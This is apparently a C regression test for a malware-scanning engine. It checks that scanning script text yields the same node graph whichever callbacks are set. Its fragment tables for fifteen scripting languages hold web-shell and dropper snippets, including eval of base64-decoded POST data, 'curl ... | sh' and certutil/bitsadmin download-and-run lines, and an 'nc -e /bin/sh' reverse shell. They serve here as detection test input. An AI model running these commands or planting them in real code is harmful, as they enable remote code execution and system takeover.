/*
 * genome / diag_text_scan_same - the graph of a script's text does not depend on which callbacks the request sets.
 *
 * The engine keeps the scan the constants stage made (on_const and on_head set) and hands it to the diagnose stage, which used to scan the same text with
 * no callbacks (scanners/objctx_textscan.c). That is right only if the nodes and the links are the same either way, and that is what this checks: for every
 * dialect and for random programs built from fragments of it - assignments built by joins and calls, calls through variables, decoders, nesting, comments, strings that hold
 * the names - the scan with no callbacks, with on_node, with on_const+on_head, and with all three give one graph (every field of every node, and every input of every node) and the
 * same count. The callbacks themselves are checked to be told in the same order whichever of them are set with it, so a stage that reads one is not given
 * a different one by the other being asked for.
 *
 * usage: diag_text_scan_same [programs-per-dialect]   (default 400)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <phenotype/diag_scan.h>
#include <textual/textual.h>

static int fails;

#define CK(c, ...) do { if (!(c)) { printf("  FAIL %s:%d  ", __FILE__, __LINE__); printf(__VA_ARGS__); printf("\n"); fails++; } } while (0)

static uint32_t rs = 77u;

static uint32_t rnd(void)
{
	rs = rs * 1103515245u + 12345u;
	return rs >> 16;
}

static uint64_t h64(uint64_t h, const void *p, size_t n)
{
	const uint8_t *b = p;

	while (n--)
		h = (h ^ *b++) * 1099511628211ull;
	return h;
}

static uint64_t graph(const struct kgenome_diag_scan *s)
{
	uint64_t h = 14695981039346656037ull;
	uint32_t i, n, j;

	if (!s)
		return h;
	n = kgenome_diag_scan_count(s);
	h = h64(h, &n, 4);
	for (i = 0; i < n; i++) {
		const struct kgenome_diag_hit *t = kgenome_diag_scan_at(s, i);

		h = h64(h, &t->at, 8); h = h64(h, &t->attr, 8); h = h64(h, &t->val, 8); h = h64(h, &t->symref, 8); h = h64(h, &t->symadd, 4);
		h = h64(h, &t->cap, 2); h = h64(h, &t->flags, 2); h = h64(h, &t->bits, 1); h = h64(h, &t->n_in, 1);
		for (j = 0; j < t->n_in && j < 4u; j++) {
			h = h64(h, &t->in[j].from, 2); h = h64(h, &t->in[j].role, 1); h = h64(h, &t->in[j].how, 1); h = h64(h, &t->in[j].kind, 1);
		}
	}
	return h;
}

struct told {
	uint64_t nodes, consts, heads;
	uint32_t n_nodes, n_consts, n_heads;
};

static void on_node(void *u, const char *nm)
{
	struct told *t = u;

	t->nodes = h64(t->nodes, nm, strlen(nm) + 1u);
	t->n_nodes++;
}

static void on_const(void *u, uint64_t off, uint64_t len, const uint8_t *v, uint32_t n)
{
	struct told *t = u;

	t->consts = h64(h64(h64(t->consts, &off, 8), &len, 8), v, n);
	t->n_consts++;
}

static void on_head(void *u, uint64_t off, uint64_t len, const uint8_t *v, uint32_t n)
{
	struct told *t = u;

	t->heads = h64(h64(h64(t->heads, &off, 8), &len, 8), v, n);
	t->n_heads++;
}

/* a small real hook for the string functions the fragments use (replace, reverse, lower, upper): what the engine's hook does for them, enough that a name built by a call is found */
static int app(void *u, const struct kgenome_textual_call *c, const uint8_t *in, uint32_t len, uint8_t *out, uint32_t cap, uint32_t *n)
{
	uint32_t i, w = 0;

	(void)u;
	if (c->op == KGENOME_TEXTUAL_DEC_REPLACE) {
		if (!c->n1)
			return 0;
		for (i = 0; i < len;) {
			if (i + c->n1 <= len && !memcmp(in + i, c->s1, c->n1)) {
				if (w + c->n2 > cap)
					return 0;
				if (c->n2)              /* a replacement by nothing has no bytes (and may have no pointer) */
					memcpy(out + w, c->s2, c->n2);
				w += c->n2;
				i += c->n1;
			} else {
				if (w + 1u > cap)
					return 0;
				out[w++] = in[i++];
			}
		}
		*n = w;
		return 1;
	}
	if (len > cap)
		return 0;
	if (c->op == KGENOME_TEXTUAL_DEC_REVERSE) {
		for (i = 0; i < len; i++)
			out[i] = in[len - 1u - i];
	} else if (c->op == KGENOME_TEXTUAL_DEC_LOWER || c->op == KGENOME_TEXTUAL_DEC_UPPER) {
		for (i = 0; i < len; i++)
			out[i] = (uint8_t)(c->op == KGENOME_TEXTUAL_DEC_LOWER ? (in[i] >= 'A' && in[i] <= 'Z' ? in[i] + 32 : in[i]) : (in[i] >= 'a' && in[i] <= 'z' ? in[i] - 32 : in[i]));
	} else {
		return 0;
	}
	*n = len;
	return 1;
}

/* fragments of a dialect: statements that make nodes, links and constants; a program is a random run of them */
struct dial {
	const char *name;
	uint32_t    lang;
	const char *pre, *post;
	const char *frag[12];
};

static const struct dial D[] = {
	{ "php", KGENOME_TEXTUAL_LANG_PHP, "<?php\n", "\n?>", {
		"$a = 'sys' . 'tem';", "$a($_GET['c']);", "eval(base64_decode($_POST['x']));", "$f = str_replace('x', '', 'cxreate_function'); $f('', $c);",
		"$b = 'ev' . 'al'; $b($d);", "system($c);", "$u = strrev('daer'); $u($p);", "file_put_contents($p, $d);", "// system($x)\n", "$c = chr(115) . chr(121) . 's';",
		"function f($x) { return system($x); } f($_GET['a']);", "echo 'system($c)';" } },
	{ "sh", KGENOME_TEXTUAL_LANG_SH, "#!/bin/sh\n", "\n", {
		"x=cur; $x\"l\" http://h/p | sh", "wget -O /var/x/a http://h/a", "chmod +x /var/x/a", "/var/x/a &", "y=\"${x}l\"", "echo hi > /var/x/f", "eval \"$y\"", "curl -o f u; sh f",
		"f() { wget $1; }", "f http://h/b", "# wget x\n", "nc -e /bin/sh 1.2.3.4 4444" } },
	{ "js", KGENOME_TEXTUAL_LANG_JS, "", "\n", {
		"var a = 'ev' + 'al'; ", "var s = new ActiveXObject('WScript.Shell'); ", "s.Run(c); ", "eval(x); ", "var p = require('child_process'); ", "p.exec(c); ", "a = 'sys'.concat('tem'); ",
		"function f(x) { return eval(x); } ", "f(y); ", "// eval(z)\n", "var u = String.fromCharCode(101, 118); ", "new Function(q)(); " } },
	{ "py", KGENOME_TEXTUAL_LANG_PY, "", "\n", {
		"import os\n", "a = 'sys' + 'tem'\n", "os.system(c)\n", "exec(base64.b64decode(x))\n", "b = 'ex' + 'ec'\n", "def f(x):\n    return os.system(x)\n", "f(y)\n", "# os.system(z)\n",
		"import subprocess\n", "subprocess.Popen(c, shell=True)\n", "u = chr(111) + chr(115)\n", "eval(compile(s, 'f', 'exec'))\n" } },
	{ "vbs", KGENOME_TEXTUAL_LANG_VBS, "", "\r\n", {
		"Set s = CreateObject(\"WScript.Shell\")\r\n", "s.Run c\r\n", "a = \"WScr\" & \"ipt.Shell\"\r\n", "Set o = CreateObject(a)\r\n", "o.Run d\r\n", "Execute x\r\n", "Function f(x)\r\n f = x\r\nEnd Function\r\n",
		"f(y)\r\n", "' s.Run z\r\n", "Dim u\r\n", "u = Chr(101) & Chr(118)\r\n", "Eval(u)\r\n" } },
	{ "perl", KGENOME_TEXTUAL_LANG_PERL, "#!/usr/bin/perl\n", "\n", {
		"$a = 'sys' . 'tem';\n", "system($c);\n", "eval($x);\n", "exec($y);\n", "open(F, \">/var/x/f\");\n", "print F $d;\n", "sub f { system($_[0]); }\n", "f($z);\n", "# system($q)\n", "`$c`;\n",
		"$u = chr(115) . 'ys';\n", "my $b = 'ev' . 'al';\n" } },
	{ "ruby", KGENOME_TEXTUAL_LANG_RUBY, "", "\n", {
		"a = 'sys' + 'tem'\n", "system(c)\n", "eval(x)\n", "exec(y)\n", "`#{c}`\n", "def f(x)\n  system(x)\n end\n", "f(z)\n", "# system(q)\n", "IO.popen(c)\n", "b = 'ev' + 'al'\n",
		"u = [115, 121].pack('c*')\n", "File.write(p, d)\n" } },
	{ "lua", KGENOME_TEXTUAL_LANG_LUA, "", "\n", {
		"local a = 'os.' .. 'execute'\n", "os.execute(c)\n", "loadstring(x)()\n", "io.popen(c)\n", "function f(x) return os.execute(x) end\n", "f(z)\n", "-- os.execute(q)\n", "local b = string.char(101, 118)\n",
		"load(b)\n", "local u = a\n", "io.open(p, 'w')\n", "os.remove(p)\n" } },
	{ "tcl", KGENOME_TEXTUAL_LANG_TCL, "", "\n", {
		"set a exec\n", "exec $c\n", "eval $x\n", "set b [string cat e val]\n", "proc f {x} { exec $x }\n", "f $z\n", "# exec q\n", "open $p w\n", "puts $d\n", "set u [format %c 101]\n", "socket $h 80\n", "file delete $p\n" } },
	{ "bat", KGENOME_TEXTUAL_LANG_BAT, "@echo off\r\n", "\r\n", {
		"set a=pow\r\n", "%a%ershell -c x\r\n", "certutil -urlcache -f http://h/a a.exe\r\n", "a.exe\r\n", "set b=cmd\r\n", "%b% /c y\r\n", "rem certutil x\r\n", "echo hi > f.txt\r\n", "del f.txt\r\n",
		"bitsadmin /transfer j http://h/b b.exe\r\n", "start b.exe\r\n", "call :f\r\n" } },
	{ "psh", KGENOME_TEXTUAL_LANG_PSH, "", "\n", {
		"$a = 'Invoke-' + 'Expression'\n", "IEX $c\n", "$s = New-Object -ComObject WScript.Shell\n", "$s.Run($d)\n", "Invoke-WebRequest -Uri $u -OutFile $p\n", "& $a $x\n", "# IEX q\n",
		"Start-Process $p\n", "$b = [char]105 + 'ex'\n", "function f($x) { IEX $x }\n", "f $z\n", "Add-Type -TypeDefinition $t\n" } },
	{ "asp", KGENOME_TEXTUAL_LANG_ASP, "<%\r\n", "\r\n%>", {
		"Set s = Server.CreateObject(\"WScript.Shell\")\r\n", "s.Run Request(\"c\")\r\n", "a = \"WScr\" & \"ipt.Shell\"\r\n", "Execute Request.Form(\"x\")\r\n", "Eval(y)\r\n", "Response.Write z\r\n",
		"Function f(x)\r\n f = x\r\nEnd Function\r\n", "f(q)\r\n", "' s.Run z\r\n", "Set o = CreateObject(a)\r\n", "o.Run d\r\n", "Dim u\r\n" } },
	{ "aspx", KGENOME_TEXTUAL_LANG_ASPX, "<%@ Page Language=\"C#\" %>\n<script runat=\"server\">\nvoid Page_Load(object o, EventArgs e) {\n", "\n}\n</script>\n", {
		"var p = new System.Diagnostics.Process(); ", "p.StartInfo.FileName = Request[\"c\"]; ", "p.Start(); ", "System.Diagnostics.Process.Start(a); ", "string a = \"cm\" + \"d\"; ", "System.IO.File.WriteAllText(f, d); ",
		"// Process.Start(q)\n", "Response.Write(z); ", "var psi = new System.Diagnostics.ProcessStartInfo(a); ", "psi.Arguments = \"/c \" + x; ", "System.Diagnostics.Process.Start(psi); ", "string u = a; " } },
	{ "jsp", KGENOME_TEXTUAL_LANG_JSP, "<%\n", "\n%>", {
		"Runtime r = Runtime.getRuntime(); ", "r.exec(request.getParameter(\"c\")); ", "String a = \"ex\" + \"ec\"; ", "Process p = r.exec(a); ", "// r.exec(q)\n", "out.println(z); ", "String u = a; ", "r.exec(u); ",
		"new ProcessBuilder(c).start(); ", "java.io.File f = new java.io.File(p); ", "f.delete(); ", "Class.forName(n); " } },
	{ "cfm", KGENOME_TEXTUAL_LANG_CFM, "", "\n", {
		"<cfexecute name=\"cmd.exe\" arguments=\"/c #url.c#\"></cfexecute>\n", "<cfset a = \"cf\" & \"execute\">\n", "<cffile action=\"write\" file=\"#p#\" output=\"#d#\">\n", "<cfscript>\n a = x;\n</cfscript>\n",
		"<!--- cfexecute q --->\n", "<cfinclude template=\"#t#\">\n", "<cfhttp url=\"#u#\" method=\"get\">\n", "<cfset b = a>\n", "<cfoutput>#z#</cfoutput>\n", "<cfobject type=\"com\" name=\"o\" class=\"WScript.Shell\">\n",
		"<cfset o.Run(c)>\n", "<cffile action=\"delete\" file=\"#p#\">\n" } },
};

int main(int argc, char **argv)
{
	int per = argc > 1 ? atoi(argv[1]) : 400, d, r;
	uint64_t nodes = 0, consts = 0, heads = 0, progs = 0;

	for (d = 0; d < (int)(sizeof D / sizeof D[0]); d++) {
		for (r = 0; r < per; r++) {
			char text[4096];
			uint32_t nf = 1u + rnd() % 9u, k, w = 0;
			struct told t0 = { 14695981039346656037ull, 14695981039346656037ull, 14695981039346656037ull, 0, 0, 0 }, t1 = t0, t2 = t0, t3 = t0;
			struct kgenome_diag_scan *s0, *s1, *s2, *s3;
			uint64_t g0, g1, g2, g3;
			struct kgenome_diag_text_req q;

			w += (uint32_t)snprintf(text + w, sizeof text - w, "%s", D[d].pre);
			for (k = 0; k < nf && w < sizeof text - 300u; k++)
				w += (uint32_t)snprintf(text + w, sizeof text - w, "%s", D[d].frag[rnd() % 12u]);
			w += (uint32_t)snprintf(text + w, sizeof text - w, "%s", D[d].post);
			memset(&q, 0, sizeof q);
			q.base = (const uint8_t *)text;
			q.size = w;
			q.lang = D[d].lang;
			q.apply = app;
			s0 = kgenome_diag_scan_text(&q);
			q.on_node = on_node;
			q.user = &t1;
			s1 = kgenome_diag_scan_text(&q);
			q.on_node = NULL;
			q.user = NULL;
			q.on_const = on_const;
			q.on_head = on_head;
			q.const_user = &t2;
			s2 = kgenome_diag_scan_text(&q);
			q.on_node = on_node;
			q.user = &t3;
			q.const_user = &t3;
			s3 = kgenome_diag_scan_text(&q);
			g0 = graph(s0); g1 = graph(s1); g2 = graph(s2); g3 = graph(s3);
			CK(g0 == g1 && g0 == g2 && g0 == g3, "%s: graph differs with the callbacks (program %d: %.60s...)", D[d].name, r, text);
			/* each callback is told the same whichever of the others is set */
			CK(t1.nodes == t3.nodes && t1.n_nodes == t3.n_nodes, "%s: the names told differ when the constants are asked for too", D[d].name);
			CK(t2.consts == t3.consts && t2.n_consts == t3.n_consts && t2.heads == t3.heads && t2.n_heads == t3.n_heads,
			   "%s: the constants told differ when the names are asked for too", D[d].name);
			CK((s0 == NULL) == (s3 == NULL) && (!s0 || kgenome_diag_scan_status(s0) == kgenome_diag_scan_status(s3)), "%s: the status differs", D[d].name);
			nodes += t3.n_nodes; consts += t3.n_consts; heads += t3.n_heads; progs++;
			kgenome_diag_scan_free(s0); kgenome_diag_scan_free(s1); kgenome_diag_scan_free(s2); kgenome_diag_scan_free(s3);
			if (fails > 10)
				return 1;
		}
	}
	CK(nodes > progs, "the programs make nodes (%llu over %llu)", (unsigned long long)nodes, (unsigned long long)progs);
	CK(consts > 0, "and constants (%llu)", (unsigned long long)consts);
	printf("genome diag_text_scan_same: %llu programs, %llu nodes told, %llu constants, %llu heads, %s\n", (unsigned long long)progs, (unsigned long long)nodes,
	       (unsigned long long)consts, (unsigned long long)heads, fails ? "FAILED" : "ok");
	return fails != 0;
}
